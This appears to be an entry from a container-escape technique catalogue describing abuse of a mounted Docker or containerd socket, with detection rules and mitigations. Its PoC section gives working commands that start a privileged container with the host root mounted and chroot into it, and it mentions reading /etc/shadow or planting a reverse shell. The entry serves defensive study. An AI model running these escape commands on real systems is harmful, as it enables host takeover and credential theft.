---
id: CE-004
name: Container runtime socket abuse
category: runtime/socket
mitre_attack: [T1611, T1525]
risk: high
detection_rules: [SIGMA-004, FALCO-004]
---

# CE-004 — Container runtime socket abuse

## Summary

`/var/run/docker.sock` (or `containerd.sock`, `crio.sock`) mounted into a
container is root-equivalent on the host: the socket API can create a new
privileged container with the host filesystem mounted, then read/write anything.
Docker-in-Docker images and CI runners are the classic offenders.

## Prerequisites

- Runtime socket mounted into the container (hostPath or sidecar volume)
- Client binary (docker/crictl) or raw gRPC/HTTP-over-socket access

## Attack path

1. Confirm the socket: `ls -la /var/run/docker.sock`
2. List host containers: `docker ps`
3. Spawn a privileged container with host mounts
4. Read host files or chroot into the host root

## PoC sketch

```bash
# via docker CLI against the mounted socket
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged -v /:/host alpine chroot /host sh

# via raw HTTP (docker API)
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# via containerd socket + ctr
ctr --address /run/containerd/containerd.sock containers list
```

With `chroot /host` inside the spawned container, every host file is reachable:
`cat /host/etc/shadow`, drop a cron job, or install a reverse shell.

## Detection

- **Logs:** runtime API logs — unusual `container create` calls with
  `Privileged: true` or host binds; socket connection audit via systemd
- **Sigma:** `SIGMA-004` — docker socket usage from inside containers
- **Falco:** `FALCO-004` — privileged container creation
- **Admission:** `admission-review` flags docker.sock/containerd.sock/crio.sock
  mounts automatically (builtin check `docker_socket_mount`)

## Mitigation

- Never mount runtime sockets into workloads
- Use CRI proxy with authorization; expose build capability via Kaniko/Buildah instead of dind
- SELinux/AppArmor confinement on runtime sockets
- Network policy: block access to socket paths

## References

- Docker daemon socket security documentation
- MITRE ATT&CK T1611, T1525 (Implant Container Image)
